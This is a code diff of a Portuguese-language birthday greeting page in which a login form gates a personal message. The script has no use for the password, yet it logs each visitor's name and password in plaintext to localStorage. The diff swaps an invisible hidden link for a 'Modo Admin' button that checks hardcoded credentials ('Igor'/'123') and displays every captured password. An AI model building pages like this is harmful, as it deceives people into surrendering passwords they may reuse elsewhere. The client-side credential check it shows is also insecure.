@@ -15,7 +15,6 @@
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      position: relative;
     }
     .container {
       background-color: rgba(255, 255, 255, 0.85);
@@ -45,24 +44,18 @@
       cursor: pointer;
       font-size: 1em;
       box-shadow: 0 4px 15px rgba(194, 24, 91, 0.3);
+      margin: 5px;
     }
-    #admin-link {
-      position: fixed;
-      bottom: 5px;
-      left: 5px;
-      font-size: 1px;
-      color: transparent;
-      cursor: pointer;
-      width: 10px;
-      height: 10px;
-    }
-    #storedData {
-      white-space: pre-line;
-      background: #fff0f5;
-      padding: 10px;
-      margin-top: 20px;
+    #admin-panel {
+      background: rgba(255,240,245,0.9);
+      padding: 15px;
       border-radius: 10px;
+      margin-top: 20px;
       display: none;
+    }
+    #respostas {
+      white-space: pre-line;
+      text-align: left;
     }
   </style>
 </head>
@@ -72,50 +65,66 @@
     <input type="text" class="login-input" id="username" placeholder="Digite seu nome" required>
     <input type="password" class="login-input" id="password" placeholder="Digite sua senha" required>
     <button class="login-btn" onclick="verMensagem()">Ver Mensagem</button>
-    <div id="storedData"></div>
-    <span id="admin-link" onclick="mostrarRespostas()">Igor</span>
+    <button class="login-btn" onclick="acessoAdmin()" style="background:linear-gradient(to right, #4b6cb7, #182848)">Modo Admin</button>
   </div>
 
   <div class="container" id="mensagem-container" style="display:none">
     <h1>Feliz Aniversário Alana!</h1>
-    <p>
-      Numa época em que um "bom dia" com emoji já é considerado investida romântica, você merece muito mais do que esses amores modernos de mensagem rápida.
-    </p>
-    <p>
-      Você é daquelas pessoas que deveria receber flores sem motivo, cartas escritas à mão com a letra tremendo de nervoso, serenatas à sua porta e convites pra dançar na sala de casa mesmo sem música tocando.
-    </p>
-    <p>
-      Alana, você é a pessoa que me faz sair da zona de conforto das telas e encarar a realidade, em 4 anos de farmácia eu descobri que você é o meu melhor remédio, você é a minha dipirona, sertralina e minha Ritalina pq vc tira minha dores, minha tristeza e aumenta o meu foco.
-    </p>
-    <p>
-      Neste seu dia, desejo que encontre tudo o que merece. Apesar da nossa amizade não ter surgido um amor verdadeiro, como você mesma disse um dia, saiba que o que sinto por você só se transformou num carinho mais maduro. Enfrentaria tudo por você exceto a sua felicidade, estarei aqui para o que precisar.
-    </p>
+    <p>Numa época em que um "bom dia" com emoji já é considerado investida romântica, você merece muito mais do que esses amores modernos de mensagem rápida.</p>
+    <p>Você é daquelas pessoas que deveria receber flores sem motivo, cartas escritas à mão com a letra tremendo de nervoso, serenatas à sua porta e convites pra dançar na sala de casa mesmo sem música tocando.</p>
+    <p>Alana, você é a pessoa que me faz sair da zona de conforto das telas e encarar a realidade, em 4 anos de farmácia eu descobri que você é o meu melhor remédio, você é a minha dipirona, sertralina e minha Ritalina pq vc tira minha dores, minha tristeza e aumenta o meu foco.</p>
+    <p>Neste seu dia, desejo que encontre tudo o que merece. Apesar da nossa amizade não ter surgido um amor verdadeiro, como você mesma disse um dia, saiba que o que sinto por você só se transformou num carinho mais maduro. Enfrentaria tudo por você exceto a sua felicidade, estarei aqui para o que precisar.</p>
     <p><strong>Com carinho, Igor ♥</strong></p>
 
     <iframe style="border-radius:12px" src="https://open.spotify.com/embed/track/52yEAOTPaQzW5vcqFKu6Du?utm_source=generator" width="100%" height="80" frameBorder="0" allowfullscreen allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"></iframe>
+    
+    <!-- Painel Admin (só visível para Igor) -->
+    <div id="admin-panel">
+      <h3>Respostas Registradas</h3>
+      <div id="respostas"></div>
+      <button onclick="limparDados()" style="background:#ff4757; margin-top:10px">Limpar Dados</button>
+    </div>
   </div>
 
   <script>
+    // Função principal (para todos os usuários)
     function verMensagem() {
-      const nome = document.getElementById('username').value;
-      const senha = document.getElementById('password').value;
+      const nome = document.getElementById('username').value.trim();
+      const senha = document.getElementById('password').value.trim();
 
       if (nome && senha) {
-        const resposta = `Nome: ${nome}\nSenha: ${senha}\n`;
-        let armazenadas = localStorage.getItem('respostas');
-        armazenadas = armazenadas ? armazenadas + '\n' + resposta : resposta;
-        localStorage.setItem('respostas', armazenadas);
+        // Armazena todas as respostas
+        const registro = `Nome: ${nome} | Senha: ${senha} | Data: ${new Date().toLocaleString()}\n`;
+        const respostasAntigas = localStorage.getItem('respostas') || '';
+        localStorage.setItem('respostas', respostasAntigas + registro);
 
+        // Mostra a mensagem
         document.getElementById('login-container').style.display = 'none';
         document.getElementById('mensagem-container').style.display = 'block';
+      } else {
+        alert("Por favor, preencha ambos os campos!");
       }
     }
 
-    function mostrarRespostas() {
-      const dados = localStorage.getItem('respostas') || 'Nenhuma resposta registrada.';
-      const campo = document.getElementById('storedData');
-      campo.textContent = dados;
-      campo.style.display = 'block';
+    // Função especial para o Igor (admin)
+    function acessoAdmin() {
+      const nome = document.getElementById('username').value.trim();
+      const senha = document.getElementById('password').value.trim();
+
+      if (nome === "Igor" && senha === "123") {
+        verMensagem(); // Mostra a mensagem normal
+        
+        // Exibe o painel admin com todas as respostas
+        document.getElementById('admin-panel').style.display = 'block';
+        document.getElementById('respostas').textContent = localStorage.getItem('respostas') || "Nenhuma resposta ainda.";
+      } else {
+        alert("Credenciais admin incorretas!");
+      }
+    }
+
+    function limparDados() {
+      localStorage.removeItem('respostas');
+      document.getElementById('respostas').textContent = "Dados limpos com sucesso!";
     }
   </script>
 </body>
